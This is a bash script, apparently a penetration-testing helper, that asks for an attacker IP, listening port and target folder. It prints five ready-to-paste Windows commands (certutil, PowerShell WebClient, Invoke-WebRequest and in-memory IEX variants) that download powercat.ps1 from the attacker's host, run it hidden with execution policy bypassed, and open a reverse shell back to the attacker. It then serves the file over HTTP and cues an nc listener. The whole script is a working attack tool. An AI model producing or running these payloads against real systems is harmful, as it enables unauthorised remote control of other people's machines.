#!/usr/bin/env bash
set -euo pipefail

# 1) Get tun0 IP and print
ip=$(ip a show tun0 2>/dev/null | awk '/inet /{print $2}' | cut -d'/' -f1 || true)
echo "Your tun0 IP is:"
if [ -n "$ip" ]; then
  echo "$ip"
else
  echo "(no tun0 found)"
fi
echo ""

# 2) Ask for attacker IP (allow override)
read -r -p "Enter your IP address (press Enter to use $ip): " custom_ip
if [ -n "$custom_ip" ]; then
  ip="$custom_ip"
  echo "Using IP: $ip"
else
  echo "Using tun0 IP: $ip"
fi
echo ""

# 3) Ask for local listening port
read -r -p "Enter your listening port (e.g., 4444): " lport
if [ -z "$lport" ]; then
  echo "Error: Port is required!"
  exit 1
fi
echo "Using port: $lport"
echo ""

# 4) Ask for output directory on target
read -r -p "Enter target output directory (press Enter for C:\\Windows\\Temp): " output_dir
if [ -n "$output_dir" ]; then
  output_dir="${output_dir%/}"
  output_dir="${output_dir%\\}"
  echo "Using output directory: $output_dir"
else
  output_dir="C:\\Windows\\Temp"
  echo "Using default directory: $output_dir"
fi
echo ""

# PowerShell script name
ps_script="powercat.ps1"

echo "==================================="
echo "Copy-paste commands below:"
echo "==================================="
echo ""

echo "# Method 1: Certutil Download + Execute"
printf 'certutil -f -urlcache -split http://%s/%s "%s\\%s" && powershell -NoP -W Hidden -ExecutionPolicy Bypass -File "%s\\%s" -c %s -p %s -e cmd\n' \
  "$ip" "$ps_script" "$output_dir" "$ps_script" "$output_dir" "$ps_script" "$ip" "$lport"
echo ""

echo "# Method 2: PowerShell WebClient DownloadFile + Execute"
printf 'powershell -NoP -W Hidden -c "(New-Object Net.WebClient).DownloadFile('"'"'http://%s/%s'"'"','"'"'%s\\%s'"'"'); powershell -NoP -ExecutionPolicy Bypass -File '"'"'%s\\%s'"'"' -c %s -p %s -e cmd"\n' \
  "$ip" "$ps_script" "$output_dir" "$ps_script" "$output_dir" "$ps_script" "$ip" "$lport"
echo ""

echo "# Method 3: PowerShell WebClient DownloadString (Execute in Memory)"
printf 'powershell -NoP -W Hidden -c "IEX (New-Object Net.WebClient).DownloadString('"'"'http://%s/%s'"'"'); powercat -c %s -p %s -e cmd"\n' \
  "$ip" "$ps_script" "$ip" "$lport"
echo ""

echo "# Method 4: PowerShell Invoke-WebRequest + Execute"
printf 'powershell -NoP -W Hidden -c "iwr http://%s/%s -OutFile '"'"'%s\\%s'"'"' -UseBasicParsing; powershell -NoP -ExecutionPolicy Bypass -File '"'"'%s\\%s'"'"' -c %s -p %s -e cmd"\n' \
  "$ip" "$ps_script" "$output_dir" "$ps_script" "$output_dir" "$ps_script" "$ip" "$lport"
echo ""

echo "# Method 5: PowerShell IEX with iwr (Execute in Memory)"
printf 'powershell -NoP -W Hidden -c "IEX (iwr http://%s/%s -UseBasicParsing); powercat -c %s -p %s -e cmd"\n' \
  "$ip" "$ps_script" "$ip" "$lport"
echo ""

echo "==================================="
echo "Starting HTTP server on port 80..."
echo "==================================="
echo "Don't forget to start your listener:"
echo "nc -lvnp $lport"
echo ""

sudo python3 -m http.server 80
